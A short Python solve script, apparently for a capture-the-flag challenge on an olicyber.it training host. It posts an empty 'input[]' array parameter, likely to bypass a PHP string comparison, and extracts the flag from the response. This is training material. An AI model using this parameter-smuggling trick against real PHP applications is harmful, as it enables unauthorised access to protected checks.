import requests
import re

url = 'http://soundofsilence.challs.olicyber.it/'
r = requests.post(url, data={'input[]':''})
flag = re.findall(r'flag\{.*?\}', r.text, re.DOTALL)
print(flag[0])